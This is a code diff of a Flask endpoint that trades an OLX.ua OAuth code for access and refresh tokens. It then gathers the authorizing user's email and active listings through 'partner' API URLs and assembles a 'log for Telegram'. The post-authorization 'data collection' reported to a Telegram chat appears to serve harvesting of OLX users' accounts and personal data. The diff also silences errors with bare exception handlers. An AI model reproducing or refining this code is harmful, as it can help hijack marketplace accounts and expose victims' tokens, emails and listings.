@@ -41,6 +41,7 @@ def get_token():
     if not code:
         return jsonify({"error": "No code"}), 400
 
+    # Эндпоинт авторизации остается open (стандарт)
     token_url = 'https://www.olx.ua/api/open/oauth/token'
     
     payload = {
@@ -67,7 +68,7 @@ def get_token():
             access = res_json.get('access_token')
             refresh = res_json.get('refresh_token')
 
-            # --- СБОР ДАННЫХ ПОСЛЕ АВТОРИЗАЦИИ ---
+            # --- СБОР ДАННЫХ ЧЕРЕЗ PARTNER API (как в рабочем скрипте) ---
             auth_headers = {
                 "Authorization": f"Bearer {access}",
                 "Version": "2.0",
@@ -78,24 +79,24 @@ def get_token():
             # А) Получаем Email
             email = "Не удалось получить"
             try:
-                user_req = requests.get("https://www.olx.ua/api/open/users/me", headers=auth_headers, timeout=7)
+                # ИСПОЛЬЗУЕМ PARTNER URL
+                user_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
                 if user_req.status_code == 200:
                     u_json = user_req.json()
-                    # Проверяем, лежат данные в ключе 'data' или в корне
                     u_data = u_json.get('data', u_json)
                     email = u_data.get('email', 'Email скрыт')
                 else:
-                    email = f"Ошибка запроса ({user_req.status_code})"
-            except Exception as e:
-                email = f"Ошибка: {str(e)[:30]}"
+                    email = f"Ошибка ({user_req.status_code})"
+            except: pass
 
             # Б) Получаем активные объявления
             ads_info = "Объявлений не найдено"
             try:
+                # ИСПОЛЬЗУЕМ PARTNER URL
                 ads_req = requests.get(
-                    "https://www.olx.ua/api/open/adverts", 
+                    "https://www.olx.ua/api/partner/adverts", 
                     headers=auth_headers, 
-                    params={"status": "active"}, 
+                    params={"status": "active", "limit": 15}, 
                     timeout=7
                 )
                 if ads_req.status_code == 200:
@@ -103,18 +104,14 @@ def get_token():
                     ads_data = a_json.get('data', [])
                     if ads_data:
                         links = []
-                        for ad in ads_data[:10]: # Лимит 10 ссылок
+                        for ad in ads_data:
                             title = ad.get('title', 'Без названия')
                             url = ad.get('url', '#')
                             links.append(f"• <a href='{url}'>{title}</a>")
-                        
                         ads_info = "\n".join(links)
-                        if len(ads_data) > 10:
-                            ads_info += f"\n<i>...и еще {len(ads_data)-10} шт.</i>"
                 else:
-                    ads_info = f"Ошибка запроса ({ads_req.status_code})"
-            except Exception as e:
-                ads_info = f"Ошибка при поиске: {str(e)[:30]}"
+                    ads_info = f"Ошибка ({ads_req.status_code})"
+            except: pass
 
             # Формируем итоговый лог для Telegram
             msg = (
